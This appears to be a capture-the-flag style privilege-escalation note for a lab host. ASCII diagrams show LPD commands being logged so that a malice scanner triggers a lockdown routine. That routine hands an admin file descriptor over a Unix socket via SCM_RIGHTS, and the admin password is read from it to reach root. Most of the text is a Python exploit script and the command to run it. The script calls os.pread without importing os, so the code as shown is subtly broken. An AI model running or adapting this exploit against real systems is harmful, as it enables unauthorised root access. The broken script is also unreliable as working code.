
root escalation :

```
You (archivist)
    │
    ├─ Send FSQUERY/FSUPLOAD/FSDOWNLOAD via LPD
    │   → gets written to commands.log
    │
    └─ Connect to /run/paperwork/mgmt.sock
        │
        ├─ scan_for_malice() returns True
        │
        └─ trigger_lockdown() sends you SCM_RIGHTS with admin_fd
            │
            └─ You pread() the admin password from the received FD
                → Use password to escalate to root
```

```
Your Machine
    │
    ├─ Connect to port 515 (LPD)
    │
    ├─ Send "FSQUERY /etc" or similar
    │   → This gets LOGGED to commands.log
    │
    │         commands.log now contains "FSQUERY"
    │                    ▼
    ├─ Connect to /run/paperwork/mgmt.sock
    │
    │   scan_for_malice() reads commands.log
    │   sees "FSQUERY" → returns True
    │                    ▼
    └─ trigger_lockdown() fires → sends you admin_fd via SCM_RIGHTS
```

```
# /tmp/exploit.py
import socket, array

def recv_fds(sock, msgsize, maxfds):
    fds = array.array("i")
    msg, ancdata, flags, addr = sock.recvmsg(
        msgsize,
        socket.CMSG_LEN(maxfds * fds.itemsize)
    )
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
    return msg, list(fds)

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

msg, fds = recv_fds(s, 1024, 10)
print(f"[*] Message: {msg.decode()}")
print(f"[*] Received fds: {fds}")

for fd in fds:
    try:
        data = os.pread(fd, 4096, 0)
        print(f"[*] fd {fd} contents:\n{data.decode()}")
    except Exception as e:
        print(f"[!] fd {fd} error: {e}")

s.close()
```

python3 /tmp/exploit.py

